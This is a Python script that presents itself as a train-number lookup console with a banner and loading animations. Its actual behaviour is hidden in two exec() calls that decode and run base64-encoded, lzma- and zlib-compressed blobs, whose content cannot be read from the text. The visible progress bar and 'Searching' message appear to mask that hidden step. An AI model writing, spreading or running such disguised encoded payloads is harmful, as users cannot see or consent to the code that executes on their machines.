# Author: Aniket Dinda
# Site: https://hackingivla.wordpress.com
#!/usr/bin/python
# -*- coding: utf-8 -*-


import requests as r
import os, sys, json, time
from os import system
from sys import exit
import lzma, base64, zlib
###################################################
os.system("cls" if os.name == "nt" else "clear")
def load_animation():

    load_str = "starting train database console..."
    ls_len = len(load_str)
    animation = "|/-\\"
    anicount = 0
    counttime = 0
    i = 0
    while counttime != 44:
        time.sleep(0.1)
        load_str_list = list(load_str)
        x = ord(load_str_list[i])
        y = 0
        if x != 32 and x != 46:
            if x > 90:
                y = x - 32
            else:
                y = x + 32
            load_str_list[i] = chr(y)
        res = ""
        for j in range(ls_len):
            res = res + load_str_list[j]
        sys.stdout.write("\r" + res + animation[anicount])
        sys.stdout.flush()
        load_str = res
        anicount = (anicount + 1) % 4
        i = (i + 1) % ls_len
        counttime = counttime + 1
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
if __name__ == "__main__":
    load_animation()
os.system("cls" if os.name == "nt" else "clear")
exec(lzma.decompress(base64.b64decode('/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4ACFAHldADCPSkMBCxlJkqTUolf17TgEP70C+F+2Q8Gn/S7h+QXF9ie4EGIi/ED0iuw0GzdzbMzhU7YxTJnOQRD/suD55jq0JmjLsRFhWCQi6haicCH4TJQVkTzoEsn3wgpmElBPLQTazraJC9MUNWOtrtYVD5UtzdF2L1dDJgAAAAAA0vLTG6OHavcAAZUBhgEAAE35bnqxxGf7AgAAAAAEWVo=')))
class banner2:
    def __init__(self):
        pass
        print(
            r"""            
                  _______        _         _____        _        
                 |__   __|      (_)       |  __ \      | |       
                    | |_ __ __ _ _ _ __   | |  | | __ _| |_ __ _ 
                    | | '__/ _` | | '_ \  | |  | |/ _` | __/ _` |
                    | | | | (_| | | | | | | |__| | (_| | || (_| |
                    |_|_|  \__,_|_|_| |_| |_____/ \__,_|\__\__,_|
                                                 
            """
        )
banner2()
print("\n\n\n")
xy = str(input("\t$ Please enter TRAIN number: ") or "12312")
os.system("cls" if os.name == "nt" else "clear")
print("\n\n")
banner2()
def process_bar():
    pass
    system(
        "mode con: cols=78 lines=20"
        if os.name == "nt"
        else "resize -s 90 150 > /dev/null"
    )
    os.system("cls" if os.name == "nt" else "clear")
    print("\n\n\n\n\n\t\t\t  Searching Please WAIT...  ")
    print("\n\n\n\n")
    animation = [
        "[■□□□□□□□□□]",
        "[■■□□□□□□□□]",
        "[■■■□□□□□□□]",
        "[■■■■□□□□□□]",
        "[■■■■■□□□□□]",
        "[■■■■■■□□□□]",
        "[■■■■■■■□□□]",
        "[■■■■■■■■□□]",
        "[■■■■■■■■■□]",
        "[■■■■■■■■■■]",
    ]
    for i in range(len(animation)):
        time.sleep(0.2)
        sys.stdout.write("\r\t\t\t\t" + animation[i % len(animation)])
        sys.stdout.flush()
    print("\n")
process_bar()
exec(zlib.decompress(base64.b64decode('eJyVT7EKwkAM3e8rQqYWRXfhxk5CFXURdaiSloPrXcml0EP8d1NEnM3b3nt5eYlplXIS6gt8+ITgWohpFZqerMUgCOQTgWrUMJbG24FdELOzW8oVc2Qj1oVhFOMLvIYZahPOGwMfRs5xZBBuXIB67O/E61rjNwC4uF9afE75hbfS0PSgQWD3WQSdY2TOS7Vpo47Ex86FolyghmVoOg2cG33P/jAXUFYusGdKCar6VB2gjQw0OYGb6vG/t9+hu12Z')))


